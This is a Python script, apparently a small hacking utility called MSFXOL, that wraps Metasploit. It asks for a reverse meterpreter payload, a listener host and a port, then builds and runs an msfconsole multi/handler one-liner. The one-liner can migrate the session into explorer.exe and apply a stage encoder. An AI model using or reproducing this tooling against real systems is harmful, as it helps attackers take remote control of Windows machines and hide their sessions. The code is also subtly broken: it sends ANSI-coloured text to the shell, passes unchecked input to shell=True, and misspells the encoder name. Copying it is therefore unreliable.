#!/bin/python3

import termcolor
import subprocess
import time
import os
import re
from prettytable import PrettyTable

# START CLEAR TERMINAL //CHANGE unix <clear>
subprocess.call('clear', shell=True) # CHANGE

logo = termcolor.colored("""

███╗   ███╗███████╗███████╗██╗  ██╗ ██████╗ ██╗     
████╗ ████║██╔════╝██╔════╝╚██╗██╔╝██╔═══██╗██║     
██╔████╔██║███████╗█████╗   ╚███╔╝ ██║   ██║██║     
██║╚██╔╝██║╚════██║██╔══╝   ██╔██╗ ██║   ██║██║     
██║ ╚═╝ ██║███████║██║     ██╔╝ ██╗╚██████╔╝███████╗
╚═╝     ╚═╝╚══════╝╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚══════╝                                                    
                                                                                                                                                                                
""", "red", attrs=["bold"])

print(logo)

# FRONT MENU
termcolor.cprint("VERSION : v0.1")
termcolor.cprint("AUTOMATED ONE-LINE SCRIPT METASPLOIT", "green", attrs=['bold'])
info = termcolor.colored("AUTHOR :", "green")
info2 = termcolor.colored("Cooki3s\n", "red", attrs=['bold'])
print(info, info2)

termcolor.cprint("[!] WARNING : [SECURITY RISK IF YOU HAVE UNTRUSTED INPUT, PLEASE BE CAUTIONS NOT TO PERMIT UNAUTHORISED ACCESS !]\n", "red", attrs=['bold'])

# OPTIONS RETURN MENU
def choices():
    while (True):
        info1 = termcolor.colored("[1] METASPLOIT -", "green", attrs=['bold'])
        info2 = termcolor.colored("ONE-LINE CUSTOM EXPLOIT [AVAILABLE] \n", "green", attrs=['bold'])
        print(info1, info2)
        time.sleep(1)
        choice = int(input("\nEnter your option >> "))
        if choice == 1:
            return ()
        else:
            raise TypeError

def msf():
    info3 = termcolor.colored("[*]", "yellow", attrs=['bold'])
    info4 = termcolor.colored("Do you need listener ? yes / no ", "white", attrs=['bold'])
    print(info3, info4)
    files2 = input("\nEnter your option >> ")
    if files2.lower() == "yes":
        print("exp: windows/meterpreter/reverse_tcp")
        PAYLOAD = input("PAYLOAD >> ")
        LHOST = input("LHOST [eth0][tun0][es333][?] >> ")
        LPORT = input("LPORT [9999][4040][4430][?] >> ")
        termcolor.cprint("\n[*] MIGRATE TO EXPLORER.EXE? yes/no ?", "white", attrs=['bold'])
        files3 = input("\nEnter your option >> ")
        if files3.lower() == "yes":
            EXPLORER = """set AutoRunScript migrate -n "explorer.exe"; """
            time.sleep(1)
            info5 = termcolor.colored("[+]", "green", attrs=['bold'])
            info6 = termcolor.colored("Roger that ghostrider. Successfully set to migrate process", "white", attrs=['bold'])
            print(info5, info6)
        else:
            EXPLORER = ""
        termcolor.cprint("\n[*] Do you need StageEncoder x86/shikata_ga_na? yes/no ?", "white", attrs=['bold'])
        files3 = input("\nEnter your option >> ")
        if files3.lower() == "yes":
            ENCODER = """set StageEncoder x86/shikata_ga_na; """
            time.sleep(1)
            info5 = termcolor.colored("[+]", "green", attrs=['bold'])
            info6 = termcolor.colored("Successfully set to StageEncoder x86/shikata_ga_na", "white", attrs=['bold'])
            print(info5, info6)
        else:
            ENCODER = ""

        commands = """\nmsfconsole -x "use exploit/multi/handler; set PAYLOAD """+PAYLOAD+"""; set LHOST """+LHOST+"""; set LPORT """+LPORT+f"""; {EXPLORER}{ENCODER}run; exit -y"
        """
        result = termcolor.colored(commands, "yellow", attrs=['bold'])
        logo2 = termcolor.colored("""
        ███████╗██╗   ██╗ ██████╗ ██████╗███████╗███████╗███████╗    ██╗
        ██╔════╝██║   ██║██╔════╝██╔════╝██╔════╝██╔════╝██╔════╝    ██║
        ███████╗██║   ██║██║     ██║     █████╗  ███████╗███████╗    ██║
        ╚════██║██║   ██║██║     ██║     ██╔══╝  ╚════██║╚════██║    ╚═╝
        ███████║╚██████╔╝╚██████╗╚██████╗███████╗███████║███████║    ██╗
        ╚══════╝ ╚═════╝  ╚═════╝ ╚═════╝╚══════╝╚══════╝╚══════╝    ╚═╝
        """, "green", attrs=["bold"])

        print(logo2)
        info7 = termcolor.colored("\n[!]", "yellow", attrs=['bold'])
        info8 = termcolor.colored("It's time to relex with a lovely cup of coffee <3\n", "white", attrs=['bold'])
        print(info7, info8)
        time.sleep(2)
        # DEBUG- print(result)
        subprocess.call(result, shell=True)

    else:
        info9 = termcolor.colored("\n[!]", "yellow", attrs=['bold'])
        info10 = termcolor.colored("DO YOU WISH GO TO MENU BACK? yes/no ", "white", attrs=['bold'])
        print(info9, info10)
        files4 = input("\nEnter your option >> ")
        if files4.lower() == "yes":
            termcolor.cprint(logo, "red")
            info = termcolor.colored("AUTHOR :", "green")
            info2 = termcolor.colored("FATAH-COOKIES\n", "red", attrs=['bold'])
            print(info, info2)
            choices()
            msf()
        else:
            termcolor.cprint("[!] GOODBYE <3", "red", attrs=['bold'])

if __name__ == '__main__':
    try:
        choices()
        msf()
    except KeyboardInterrupt:
        print("\nGoodbye!")
        quit()
